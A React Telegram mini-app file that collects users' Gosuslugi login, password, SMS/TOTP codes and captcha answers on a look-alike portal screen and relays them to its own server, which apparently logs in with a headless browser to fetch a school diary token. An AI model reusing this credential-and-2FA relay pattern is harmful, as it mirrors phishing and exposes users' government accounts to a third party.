import { useState, useEffect } from 'react';
import { Shield, CheckCircle2, AlertCircle, ChevronRight, RefreshCw, Lock, Phone } from 'lucide-react';

const SERVER_URL = import.meta.env.VITE_SERVER_URL || 'http://localhost:5000';

type Step = 'welcome' | 'login' | 'polling' | 'otp' | 'captcha' | 'success' | 'error';

export default function App() {
  const [step, setStep] = useState<Step>('welcome');
  const [tgUserId, setTgUserId] = useState('');
  const [tgFirstName, setTgFirstName] = useState('');

  const [login, setLogin] = useState('');
  const [password, setPassword] = useState('');
  
  const [sessionId, setSessionId] = useState('');
  const [userInput, setUserInput] = useState('');
  const [captchaImg, setCaptchaImg] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  // Progress bar state for polling
  const [progressPercent, setProgressPercent] = useState(0);
  const [progressText, setProgressText] = useState('Открываем безопасное соединение...');

  useEffect(() => {
    try {
      const tg = (window as any).Telegram?.WebApp;
      if (tg) {
        tg.ready();
        tg.expand();
        const user = tg.initDataUnsafe?.user;
        if (user?.id) setTgUserId(String(user.id));
        if (user?.first_name) setTgFirstName(user.first_name);
      } else {
        setTgUserId('123456789');
        setTgFirstName('Тест');
      }
    } catch { setTgUserId('123456789'); setTgFirstName('Тест'); }
  }, []);

  // Polling logic
  useEffect(() => {
    if (step !== 'polling' || !sessionId) return;
    
    // Animate progress bar (assume ~25 seconds max for playwright, if no OTP)
    let percent = 0;
    const progressInterval = setInterval(() => {
      percent += 1;
      if (percent > 95) percent = 95; // Wait at 95% until server responds
      setProgressPercent(percent);

      if (percent === 3) setProgressText('Запускаем защищённый браузер...');
      else if (percent === 8) setProgressText('Переходим на страницу авторизации...');
      else if (percent === 15) setProgressText('Вводим логин и пароль...');
      else if (percent === 25) setProgressText('Ожидаем ответ от Госуслуг...');
      else if (percent === 40) setProgressText('Проверяем наличие СМС-защиты...');
      else if (percent === 55) setProgressText('Связываемся с Дневником...');
      else if (percent === 70) setProgressText('Получаем токен доступа...');
      else if (percent === 85) setProgressText('Завершаем настройку...');
    }, 250); // Updates 4 times a second
    
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${SERVER_URL}/api/miniapp/auth/status/${sessionId}`);
        if (res.ok) {
          const data = await res.json();
          if (data.status === 'Success') {
            clearInterval(interval);
            clearInterval(progressInterval);
            setProgressPercent(100);
            setStep('success');
            setTimeout(() => (window as any).Telegram?.WebApp?.close?.(), 3000);
          } else if (data.status === 'RequiresOtp') {
            clearInterval(interval);
            clearInterval(progressInterval);
            setUserInput('');
            setStep('otp');
          } else if (data.status === 'RequiresCaptcha') {
            clearInterval(interval);
            clearInterval(progressInterval);
            setCaptchaImg(data.captchaImage);
            setUserInput('');
            setStep('captcha');
          } else if (data.status === 'Failed' || data.status === 'Expired') {
            clearInterval(interval);
            clearInterval(progressInterval);
            setErrorMsg(data.errorMessage || 'Сессия истекла или произошла ошибка');
            setStep('error');
          }
        } else {
          // res is not ok, probably 429 Too Many Requests or 500
          console.error(`Status HTTP ${res.status}`);
          // Do not fail immediately, keep trying (ngrok limits)
        }
      } catch (e: any) { 
        console.error('Poll error:', e);
      }
    }, 4000); // Polling every 4 seconds instead of 2 to avoid ngrok rate limits
    
    return () => {
      clearInterval(interval);
      clearInterval(progressInterval);
    };
  }, [step, sessionId]);

  const handleStartAuth = async () => {
    if (!login || !password) return;
    setProgressPercent(0);
    setProgressText('Открываем безопасное соединение...');
    setStep('polling');
    setErrorMsg('');
    try {
      const res = await fetch(`${SERVER_URL}/api/miniapp/auth/start`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ TelegramUserId: tgUserId, Login: login, Password: password }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      setSessionId(data.sessionId);
    } catch (e: any) {
      setErrorMsg('Ошибка связи с сервером. ' + e.message);
      setStep('error');
    }
  };

  const handleSubmitInput = async () => {
    if (!userInput) return;
    setProgressPercent(40); // Resume progress from middle
    setProgressText('Проверяем введённый код...');
    setStep('polling');
    try {
      const res = await fetch(`${SERVER_URL}/api/miniapp/auth/submit-input`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ SessionId: sessionId, Input: userInput }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
    } catch (e: any) {
      setErrorMsg('Ошибка отправки кода. ' + e.message);
      setStep('error');
    }
  };

  // ─── WELCOME ─────────────────────────────────────────────────────────────
  if (step === 'welcome') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle"><Shield size={38} className="logo-icon" /></div>
        <h1 className="app-title">Mirage Diary</h1>
        <p className="app-sub">
          {tgFirstName ? `Привет, ${tgFirstName}! ` : ''}
          Подключите дневник через Госуслуги.
        </p>
      </div>

      <div className="steps-card">
        <div className="step-row"><span className="step-badge">1</span><span>Введите логин и пароль от Госуслуг</span></div>
        <div className="step-row"><span className="step-badge">2</span><span>Мы безопасно получим токен дневника</span></div>
        <div className="step-row"><span className="step-badge">3</span><span>Пароль нигде не сохраняется</span></div>
      </div>

      <button className="btn-primary" onClick={() => setStep('login')}>
        Продолжить <ChevronRight size={18} />
      </button>
    </div>
  );

  // ─── LOGIN ─────────────────────────────────────────────────────────────
  if (step === 'login') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle logo-circle--amber"><Lock size={32} className="logo-icon" /></div>
        <h1 className="app-title">Госуслуги</h1>
        <p className="app-sub">Введите данные для входа</p>
      </div>

      <div className="input-group">
        <label className="input-label">Телефон, Email или СНИЛС</label>
        <input 
          type="text" 
          className="text-input" 
          value={login} 
          onChange={(e) => setLogin(e.target.value)} 
          placeholder="Например, +7 (999) 000-00-00" 
        />
      </div>

      <div className="input-group mt-4">
        <label className="input-label">Пароль</label>
        <input 
          type="password" 
          className="text-input" 
          value={password} 
          onChange={(e) => setPassword(e.target.value)} 
          placeholder="••••••••" 
        />
      </div>

      <button className="btn-primary mt-6" onClick={handleStartAuth} disabled={!login || !password}>
        Войти
      </button>
      <button className="btn-ghost mt-2" onClick={() => setStep('welcome')}>Отмена</button>
    </div>
  );

  // ─── OTP / 2FA ─────────────────────────────────────────────────────────────
  if (step === 'otp') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle logo-circle--amber"><Phone size={32} className="logo-icon" /></div>
        <h1 className="app-title">Проверка безопасности</h1>
        <p className="app-sub">Введите код из СМС или TOTP приложения</p>
      </div>

      <div className="input-group mt-4">
        <input 
          type="text" 
          className="text-input text-center text-lg" 
          value={userInput} 
          onChange={(e) => setUserInput(e.target.value)} 
          placeholder="000000" 
          maxLength={6}
          autoFocus
        />
      </div>

      <button className="btn-primary mt-6" onClick={handleSubmitInput} disabled={userInput.length < 4}>
        Подтвердить
      </button>
    </div>
  );

  // ─── CAPTCHA ─────────────────────────────────────────────────────────────
  if (step === 'captcha') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle logo-circle--amber"><Shield size={32} className="logo-icon" /></div>
        <h1 className="app-title">Защита от роботов</h1>
        <p className="app-sub">Введите текст с картинки</p>
      </div>

      <div className="captcha-container mt-4">
        {captchaImg && <img src={`data:image/jpeg;base64,${captchaImg}`} alt="Captcha" className="captcha-img" />}
      </div>

      <div className="input-group mt-4">
        <input 
          type="text" 
          className="text-input text-center text-lg" 
          value={userInput} 
          onChange={(e) => setUserInput(e.target.value)} 
          placeholder="Текст с картинки" 
          autoFocus
        />
      </div>

      <button className="btn-primary mt-6" onClick={handleSubmitInput} disabled={!userInput}>
        Продолжить
      </button>
    </div>
  );

  // ─── POLLING (LOADING) ───────────────────────────────────────────────────
  if (step === 'polling') return (
    <div className="screen screen-center">
      <div className="spinner-wrap mb-4">
        <div className="spinner-ring" />
      </div>
      
      <div className="progress-container w-full max-w-sm mt-6">
        <div className="progress-bar-bg">
          <div className="progress-bar-fill" style={{ width: `${progressPercent}%` }}></div>
        </div>
        <p className="sync-title mt-4">{progressText}</p>
        <p className="sync-sub mt-2">Пожалуйста, подождите. Это может занять до 30 секунд.</p>
      </div>
    </div>
  );

  // ─── SUCCESS ─────────────────────────────────────────────────────────────
  if (step === 'success') return (
    <div className="screen screen-center">
      <div className="success-circle">
        <CheckCircle2 size={52} className="success-icon" />
      </div>
      <h2 className="success-title">Успешно!</h2>
      <p className="success-sub mt-2">Вы вошли в систему. Окно закроется автоматически.</p>
    </div>
  );

  // ─── ERROR ───────────────────────────────────────────────────────────────
  if (step === 'error') return (
    <div className="screen screen-center">
      <div className="error-circle">
        <AlertCircle size={52} className="error-icon" />
      </div>
      <h2 className="error-title">Ошибка входа</h2>
      <p className="error-sub mt-2">{errorMsg}</p>
      <button className="btn-primary mt-6" onClick={() => setStep('login')}>
        <RefreshCw size={16} /> Попробовать снова
      </button>
    </div>
  );

  return null;
}
